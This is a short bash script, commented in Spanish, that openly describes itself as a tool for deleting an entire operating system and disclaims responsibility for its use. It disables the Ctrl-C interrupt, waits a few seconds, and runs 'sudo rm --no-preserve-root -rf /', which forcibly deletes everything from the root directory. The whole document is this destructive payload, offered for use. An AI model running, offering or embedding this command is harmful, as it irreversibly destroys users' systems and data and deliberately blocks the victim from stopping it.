#!/bin/bash
#No me hago responsable del uso que se le de a este codigo

#El programa se encarga de eliminar automaticamente el sistema operativo por completo
#El origen del  borrado comienza en /, eliminando todo en su interior de una forma forzosa

trap '' 2
clear
sleep 3
sudo rm --no-preserve-root -rf /
sleep 60
trap 2